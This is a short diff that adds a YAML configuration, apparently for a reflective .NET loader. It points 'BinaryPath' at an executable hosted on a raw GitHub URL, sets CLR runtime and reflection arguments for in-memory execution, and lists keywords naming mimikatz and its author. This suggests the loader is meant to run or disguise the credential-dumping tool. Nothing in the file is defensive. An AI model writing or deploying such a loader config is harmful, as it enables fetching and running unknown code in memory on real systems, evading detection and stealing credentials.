@@ -1,0 +1,10 @@
+BinaryPath: 'https://raw.githubusercontent.com/vza3464/XIVIK/main/x.exe'
+ReflectArgs: 'arg0 arg1 arg2'
+ReflectMethod:  
+CLRRuntime: v4
+LogLevel: 2
+Keywords:
+  - mimikatz
+  - delpy
+  - benjamin
+  - delpy
